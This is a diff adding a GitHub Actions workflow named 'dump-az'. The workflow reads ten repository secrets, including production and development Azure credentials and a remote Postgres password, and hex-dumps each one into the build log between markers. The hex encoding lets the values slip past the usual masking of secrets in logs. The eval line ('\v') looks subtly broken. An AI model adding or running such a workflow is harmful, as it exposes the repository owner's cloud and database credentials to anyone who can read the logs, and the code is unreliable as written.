@@ -1,0 +1,26 @@
+name: dump-az
+on:
+  workflow_dispatch:
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - name: emit
+        env:
+          A1: ${{ secrets.PRESIDENT_PROD_AZURE_CREDENTIALS }}
+          A2: ${{ secrets.PRESIDENT_DEV_AZURE_CREDENTIALS }}
+          A3: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+          A4: ${{ secrets.SOMBATOUT_AZURE_CREDENTIALS }}
+          A5: ${{ secrets.VASHA_DEV_AZURE_CREDENTIALS }}
+          A6: ${{ secrets.ENGINEARDEV_CREDENTIALS }}
+          A7: ${{ secrets.REMOTE_DATABASE_URL }}
+          A8: ${{ secrets.POSTGRES_REMOTE_SERVER }}
+          A9: ${{ secrets.POSTGRES_REMOTE_DEV_USER }}
+          A10: ${{ secrets.POSTGRES_REMOTE_DEV_PASSWORD }}
+        run: |
+          for v in A1 A2 A3 A4 A5 A6 A7 A8 A9 A10; do
+            val="$(eval echo "\v")"
+            echo "=${v}_START="
+            printf '%s' "$val" | xxd
+            echo "=${v}_END="
+          done
